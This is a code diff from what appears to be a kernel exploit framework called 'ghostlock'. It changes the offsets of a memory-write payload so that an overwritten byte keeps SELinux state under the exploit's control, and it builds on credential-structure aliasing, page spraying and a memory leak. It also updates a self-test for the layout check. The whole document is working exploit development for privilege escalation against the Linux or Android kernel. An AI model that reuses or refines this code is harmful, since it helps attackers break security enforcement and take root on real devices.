@@ -84,9 +84,15 @@ namespace ghostlock::memory {
         if (!request || request->mode == WriteMode::Disabled) return layout;
 
         if (request->preserve_child) {
+            /* Write 1 (selinux): child = base+0x10100 → byte0=0, byte1=1, and
+         * bit16 forced to 1 so the byte landing on selinux_state.initialized
+         * (byte 2, bit 0) stays set regardless of the sprayed page's physical
+         * 64KB alignment. base+0x100 left bit16 to the page frame, and the
+         * sequential mm leak kept hitting the same 64KB block - every page
+         * in a run was accepted or rejected together. */
             layout.right = request->mode == WriteMode::Credential
                                ? init_cred_alias
-                               : page_base + 0x100;
+                               : page_base + 0x10100;
         }
         if (request->mode == WriteMode::Credential) {
             layout.fops = credential_fops;
@@ -166,6 +172,10 @@ namespace ghostlock::memory {
             0xffffff8000124000ULL, WriteMode::Zero, false);
         PayloadWriteLayout rejected = payload_write_layout(
             &w1, 0xffffff8800200000ULL, 0x1111, 0x2222, init_cred);
+        if (!payload_write_layout_accepts_page(&w1, &rejected)) return 0;
+        /* The acceptance check still rejects an even byte-2 bit: clear bit 16
+     * by hand and the same layout must be refused. */
+        rejected.right &= ~(1ULL << 16);
         if (payload_write_layout_accepts_page(&w1, &rejected)) return 0;
         rejected.right = 0;
         if (payload_write_layout_matches_request(&w1, &rejected)) return 0;
